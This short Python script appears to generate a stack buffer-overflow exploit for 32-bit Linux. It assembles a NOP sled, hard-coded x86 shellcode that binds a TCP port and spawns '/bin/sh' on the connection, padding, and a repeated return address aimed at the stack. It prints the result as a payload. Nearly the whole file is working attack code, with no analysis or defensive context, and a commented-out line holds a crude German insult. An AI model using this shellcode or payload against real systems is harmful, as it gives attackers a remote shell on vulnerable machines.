import struct
import argparse
import sys

NOP = "\x90"

#parser = argparse.ArgumentParser()
#parser.add_argument('--slide', type=int)
#parser.add_argument('--padding', type=int)
#parser.add_argument('--EIP', type=str)
#args = parser.parse_args()

#slide = args.slide or 64
#stack_safety_padding = args.padding or 256
#EIP = args.EIP or "\x50\xf0\xff\xfb" # struct.pack("I", int(args.EIP.split("0x")[-1], 16)) if args.EIP else "\xc0\xf4\xff\xbf"


#print(slide, stack_safety_padding, EIP)
#raise Exception("hurensohn")

injection_code = (
"\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x66\x68"
"\xaa\xaa\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1"
"\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x03"
"\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x52"
"\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xb3\x08\xcd\x80"
)

#EIP = struct.pack("@I",0xbffff000)
#EIP = b"\x00\xf0\xff\xbf"
#EIP = "\x41\x42\x43\x44"
EIP = struct.pack("I",0xbffff060)
EIP = "\x60\xf0\xff\xbf"
overflow = 524
buf_len = 512
stack_safety_padding = 256
injection_code_len = len(injection_code)

# slide + len_inj + padd + 4 = buf_len + rest = overflow
slide = overflow - sum((stack_safety_padding, injection_code_len, 7*4))
#print(slide)
payload = (
    (NOP * slide) +
    (injection_code) +
    (NOP * stack_safety_padding) +
    (8 * EIP)
)

print(payload)
#print(EIP * 8)
#print(EIP)
# +
#    EIP * 8
#)
#sys.stdout.buffer.write(payload)
#print(payload)
#print(EIP)